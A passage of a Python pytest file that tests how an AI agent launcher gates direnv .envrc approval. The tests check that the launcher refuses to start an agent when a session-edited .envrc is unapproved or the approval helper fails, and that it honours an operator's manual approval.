    session_repo, stub_direnv, tmp_path, monkeypatch
):
    """The launcher approves AFTER the sync, so what is approved is what the agent will load."""
    worktree = session_repo["worktree"]
    stub_direnv.allow(worktree)
    _land_on_main(session_repo, "export PROJECT_ENV=v2\n")

    code, handoffs = _launch_in(session_repo["root"], tmp_path, monkeypatch, stub_direnv)

    assert (worktree / ".envrc").read_text() == "export PROJECT_ENV=v2\n", "precondition: the launch synced"
    assert code == 0 and handoffs, "the launch did not reach its handoff"
    assert stub_direnv.approved(worktree), "the launch handed off with the synced .envrc still blocked"


def test_given_an_untrusted_envrc_when_launched_then_the_launch_fails_before_the_handoff_and_names_the_fix(
    session_repo, stub_direnv, tmp_path, monkeypatch, capsys
):
    worktree = session_repo["worktree"]
    envrc = worktree / ".envrc"
    envrc.write_text("export PROJECT_ENV=edited-by-the-session\n")

    code, handoffs = _launch_in(session_repo["root"], tmp_path, monkeypatch, stub_direnv)

    assert handoffs == [], "the agent was handed off without its project environment"
    assert code not in (0, None)
    assert not stub_direnv.approved(worktree)
    err = capsys.readouterr().err
    assert "[launch] direnv: Error:" in err, err
    assert str(envrc) in err and f"direnv allow {worktree}" in err, err


def test_given_a_relaunch_with_a_resume_notice_when_the_child_body_starts_then_the_notice_reaches_the_launch_log(
    session_repo, stub_direnv, child_body
):
    """The relaunch path's resume outcome is logged as the launch path's is, not left on the pane."""
    from ai_cli import config

    config_file = config.get_xdg_config_home() / "config.toml"
    config_file.parent.mkdir(parents=True, exist_ok=True)
    config_file.write_text('[relaunch]\nbackground_session_resolver = "/bin/false"\n', encoding="utf-8")
    started = datetime.now(UTC)

    run = child_body(session_repo["worktree"])

    finished = datetime.now(UTC)
    resume = [line for line in run.log.splitlines() if "[internal] resume:" in line]
    assert resume, f"the resume notice never reached the launch log: {run.stderr}"
    assert all(_stamp_within(line, started, finished) for line in resume), resume


def test_given_an_edited_envrc_the_operator_approved_when_the_child_body_starts_then_the_agent_starts_with_it(
    session_repo, stub_direnv, child_body
):
    """An approval the operator gave by hand stands, also on a direnv that predates ``status --json``.

    The stand-in answers ``status`` with the text report direnv 2.32 and earlier print
    whatever the flags, so reading only the JSON would take this approved file for an
    unapproved one and refuse to start.
    """
    worktree = session_repo["worktree"]
    (worktree / ".envrc").write_text("export PROJECT_ENV=reviewed-by-the-operator\n")
    stub_direnv.allow(worktree)

    run = child_body(worktree)

    assert [start["PROJECT_ENV"] for start in run.starts] == ["reviewed-by-the-operator"], run.stderr


@pytest.mark.parametrize("status", [1, 127], ids=["helper-crashed", "helper-missing"])
def test_given_an_approval_helper_that_cannot_run_when_the_child_body_starts_then_no_agent_starts(
    session_repo, stub_direnv, child_body, status
):
    """D-A3 fails closed: a helper that crashed or is missing never starts an agent beside a blocked .envrc."""
    worktree = session_repo["worktree"]

    run = child_body(worktree, env={"FAKE_AI_PREPARE_EXIT": str(status)})

    assert run.starts == [], "an agent started although the .envrc check never ran"
    assert run.returncode == 77, run.stderr
    assert f"exited {status}" in run.stderr and "ai internal prepare-project-env" in run.stderr, run.stderr
    errors = [line for line in _session_lines(run.log, "direnv") if "Error:" in line]
    assert errors and f"exited {status}" in errors[0], run.log
